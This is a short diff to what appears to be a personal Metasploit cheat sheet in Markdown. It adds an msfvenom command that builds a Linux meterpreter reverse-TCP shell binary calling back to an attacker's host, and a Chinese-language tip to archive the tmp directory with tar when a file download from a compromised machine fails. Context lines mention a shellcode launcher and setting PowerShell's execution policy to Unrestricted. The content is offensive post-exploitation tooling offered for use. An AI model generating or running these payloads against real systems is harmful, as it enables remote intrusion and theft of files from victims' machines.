@@ -16,6 +16,10 @@ tag: metasploit
     https://github.com/clinicallyinane/shellcode_launcher/
     `shellcode_launcher.exe -i test.c`
 
+- linux 
+
+    `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=< Your IP Address> LPORT=< Your Port to Connect On> -f elf > shell.elf`
+
 ## meterpreter
 
 - handle
@@ -40,3 +44,9 @@ tag: metasploit
 - 开执行权限
 
     Set-ExecutionPolicy Unrestricted
+
+## linux 
+
+- 遇到文件下载失败 试试先打包 再下
+
+    打包当前路径 tmp目录 tar -zcvf tmp.tar.gz ./tmp
